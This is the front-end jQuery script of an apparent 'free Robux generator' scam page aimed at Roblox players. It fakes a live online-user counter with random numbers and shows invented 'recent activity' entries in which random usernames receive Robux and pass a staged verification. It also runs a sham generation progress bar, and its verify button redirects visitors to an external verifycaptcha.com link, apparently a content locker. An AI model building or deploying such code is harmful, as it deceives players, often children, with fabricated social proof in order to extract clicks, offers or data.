$("div#ContactForm :input").focus(function() {
  $("label[for='" + this.id + "']").addClass("labelfocus");
}).blur(function() {

	if( $(this).val().length === 0 ) {
  		$("label[for='" + this.id + "']").fadeIn().removeClass("labelfocus");
    }

});

var usersOnline  	 = 														620;                    

//===========================[ Global Script ]===================================

//------------------------------[ Document ]-------------------------------------

$( document ).ready( function( ) {

  //---------------------------[ Extend jQuery ]---------------------------------

  $.fn.extend({

    animateCss: function( animationName, callback ) {

      var animationEnd = ( function( el ) {

        var animations = {

          animation: 'animationend',
          OAnimation: 'oAnimationEnd',
          MozAnimation: 'mozAnimationEnd',
          WebkitAnimation: 'webkitAnimationEnd',

        };

        for( var t in animations ) {

          if ( el.style[ t ] !== undefined ) {

            return animations[ t ];

          }

        }

      } )( document.createElement( 'div' ) );

      this.addClass( 'animated ' + animationName ).one( animationEnd, function() {

        $( this ).removeClass( 'animated ' + animationName );

        if ( typeof callback === 'function' ) callback();

      });

      return this;

    },

  });

	//---------------------------[ Sound Effect ]--------------------------------

	  ion.sound({
	  sounds: [

	    {

	      name: "click",
	      path: "audio/",
	      volume: 0.5

	    }

	  ],

	    path: "audio/",
	    preload: true,
	    multiplay: true

	  });
	  
	  $( '.soundclick' ).click( function () {

	    ion.sound.play( 'click' );

	  });


  //--------------------------[ Online Users Function ]-----------------------------

	function getOnlineUsers() {

		var randCalc = Math.floor( Math.random() * 10 + 1 );

		if ( randCalc <= 5 ) {

			usersOnline = usersOnline + Math.floor( Math.random() * 10 + 1 );

		} else {

			usersOnline = usersOnline - Math.floor( Math.random() * 10 + 1 );

		}

		$( '.server-users' ).html( usersOnline );

	}

  	setInterval( function() { getOnlineUsers() }, 1000 );

    //---------------------------[ Button Verify ]---------------------------------

	$( '.btnVerify' ).click( function() {

	    window.location.href = "https://www.verifycaptcha.com/cl.php?id=1d202340a52b4f1a8e6f5bb0ca7f71ef";

	});

	//---------------------------[ Recent Activity ]-------------------------------

    setTimeout( newActivity, 2000 );

    function newActivity() {

    	var users    = [ '441Binder','Johnny', 'Attacklord', 'poodiepie', "Marko", "PesaJajar", "Ivan", "xxMine", "9814Bind", "P!xel", "haxhack", "EarthHacker", "9/4gen", "ClashHacker", 'new_kid',
                  		 'BloodMaster', 'lovegaming', 'Johnny', 'NaneK', 'Marko_991', 'JackHammer9', 'fuzzzy', 'tester', 'yearboy1007', 'Ministar', 'Haxajmo', 'Pottato', 'GirlHackingxD', 'Alex',
                  		 'Coder', 'Hillck23', 'Creeper', 'zaCk', 'only123', 'gunshaxer', 'MyNameIsShoo' ];

        var robloxs  = [ '1600', '2200', '4600', '12000' ];                  

        var roblox   = robloxs[ Math.floor( Math.random() * robloxs.length ) ];
        var user     = users[ Math.floor( Math.random() * users.length ) ];	


        $( '.recentlist' ).hide().html('<div class="row">' +
        	'<div class="recentname">'+user+'</div>' +
				'<div class="recentinfo">' +
					'<ul>' +
						'<li><img src="https://i.imgur.com/WnrU2UR.png" alt="robux" /><p><em class="js-coins-activity">'+roblox+'</em><br /><span>Robux</span></p></li>'+
					'</ul>' +
				'</div>' +
        	'<div class="row">' +
				'<div class="wizard-steps-container">' +
			        '<div class="progress-bar-container">' +
			        	'<div class="progress-bar"></div>' +
	        		'</div>' +
	        		'<div class="steps">' +
		        		'<div class="step active"><span class="label">Generation</span></div>' +
		        		'<div class="step active"><span class="label jsVerifyActivity">Verification</span></div>' +
		        		'<div class="step last-step"><span class="label"></span></div>' +
	        		'</div>' +
        		'</div>' +
        	'</div>' +
        '</div>').fadeIn();   

       $( '.js-coins-activity' ).countTo({
            from: 10,
            to: roblox,
            speed: 1000,
            refreshInterval: 1,
            onComplete: function ( value ) {  

		       $( '.wizard-steps-container .progress-bar-container .progress-bar' ).css( 'width', '80%' );
		       $( '.jsVerifyActivity' ).html( 'Verifying <i class="fas fa-spinner fa-spin"></i>' );

		        setTimeout( function() {

		            $( '.wizard-steps-container .progress-bar-container .progress-bar' ).css( 'width', '100%' );
		            $( '.wizard-steps-container .progress-bar-container .progress-bar' ).css( 'background', '#00922d' );	            		
		            $( '.step' ).css( 'background', '#00922d' );	            		
		            $( '.jsVerifyActivity' ).html( 'Verified <i class="fas fa-check"></i>' );
		            $( '.jsVerifyActivity' ).css( 'color', '#00a735' );
		            $( '.last-step' ).addClass( 'active' );

		            setTimeout( function() {

		            	setTimeout( newActivity, 2000 ); // Don't remove this, it's important

		            }, 2000 );

		        }, 4000 );

            }

        });
    }

  //----------------------------[ Platform Select ]----------------------------------

	$( '.platforms ul li' ).click( function() {

		$( '.platforms ul li' ).removeClass( 'platform-active' );
	    $( this ).addClass( 'platform-active' );

	});	    

  //----------------------------[ Progress Bar ]------------------------------------

    function progressBar() {

        var width            = 1;
        var intervalProgress = setInterval( frame, 0100 );

        function frame() {

            if ( width >= 100 ) {

                clearInterval( intervalProgress );  

                setTimeout( function() {

				    $( '.generatorPage' ).animateCss( 'fadeOutRight', function() {

				        $( '.generatorPage' ).hide();

				        $( '.playerPage' ).show();         
				        $( '.playerPage' ).animateCss( 'fadeInLeft' );
				            
				    });	 	

                }, 2000 ); 

            } else {

                width++; 
                $( '.generator-bar' ).css( 'width', width + '%' );
                $( '.generator-bar' ).html( width * 1 + '%' );

            }

        }

    }  

  //----------------------------[ Platform Select ]----------------------------------

	$( '.packs' ).click( function() {

		$( '.packs' ).removeClass( 'packs-active' );
	    $( this ).addClass( 'packs-active' );

	    $( '.packagesPage' ).animateCss( 'fadeOutRight', function() {

	        $( '.packagesPage' ).hide();

	        $( '.generatorPage' ).show();         
	        $( '.generatorPage' ).animateCss( 'fadeInLeft' );

	        $( '.lastrobux' ).html( $( '.packs-active' ).attr( 'data-value' ) );

	        progressBar();
	            
	    });	 	   

	});	   

  //-----------------------------[ Btn Generate ]-----------------------------------  

	$( '.btnGenerate' ).click( function() {		

	    var player_name = $( '.usernameInput' ).val();

	    if( player_name == "" || player_name.replace(/ /g,'').length < 3 ) {

	    	$( '#ContactForm' ).animateCss( 'shake' );

	    } else if( !$( '.platform-active' ).length ) {

	    	$( '.platforms' ).animateCss( 'shake' );

	    } else {

	    	$( '.lastname' ).html( player_name );
	    	$( '.verify-name' ).html( player_name );

	        $( '.infoPage' ).animateCss( 'fadeOutRight', function() {

	            $( '.infoPage' ).hide();

	            $( '.packagesPage' ).show();         
	            $( '.packagesPage' ).animateCss( 'fadeInLeft' );
	            
	        });	 

	    }


	}); 

});
